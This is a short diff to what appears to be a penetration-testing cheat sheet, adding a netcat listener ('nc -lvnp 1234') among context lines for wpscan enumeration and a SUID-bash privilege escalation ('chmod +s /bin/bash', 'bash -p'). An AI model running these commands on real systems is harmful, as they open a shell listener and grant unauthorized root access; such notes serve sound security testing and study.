@@ -35,6 +35,9 @@ tshark -Y'http.request.method == "GET" -i eth0
 wpscan --url domain.com --enumerate u
 wpscan --url domain.com --enumerate vp,vt --plugins-detection
 
+nc -lvnp 1234
+
+
 
 sudo chmod +s /bin/bash
 bash -p
